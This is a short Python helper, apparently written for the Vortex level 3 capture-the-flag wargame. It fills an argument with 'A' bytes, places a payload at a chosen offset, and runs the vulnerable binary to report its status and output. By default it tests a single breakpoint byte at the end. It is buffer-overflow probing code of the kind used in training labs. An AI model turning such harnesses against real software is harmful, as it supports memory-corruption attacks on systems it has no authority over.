"""Make one argument of N bytes plus our payload at a given offset, and
report what the started victim did (status and any output)."""
import os, subprocess, sys

def victim_status(N, payload, off, victim="/vortex/vortex3", timeout=15):
    arg = bytearray(b"A" * N)
    if off + len(payload) > N:
        raise ValueError("payload does not fit")
    arg[off:off + len(payload)] = payload
    r = subprocess.run([victim, bytes(arg)], capture_output=True, timeout=timeout)
    return r.returncode, r.stdout, r.stderr

if __name__ == "__main__":
    N = int(sys.argv[1])
    print(victim_status(N, b"\xcc", N - 1))
